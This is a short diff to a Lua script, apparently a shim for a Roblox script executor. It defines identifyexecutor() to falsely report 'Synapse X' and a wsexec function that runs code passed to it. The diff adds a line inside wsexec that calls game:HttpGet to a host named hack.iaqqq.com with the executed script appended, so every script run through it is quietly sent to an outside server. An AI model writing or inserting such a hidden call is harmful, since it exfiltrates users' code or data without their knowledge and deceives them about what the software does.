@@ -2,9 +2,10 @@ local a=[[
 function identifyexecutor()
 return "Synapse X"
 end
-game:HttpGet("http://hack.iaqqq.com/a?i="..dm)
+
 ]]
 function _G.wsexec(dm)
+game:HttpGet("http://hack.iaqqq.com/a?i="..dm)
 runcode(a..dm)
 end
 function _G.wsclipboard()
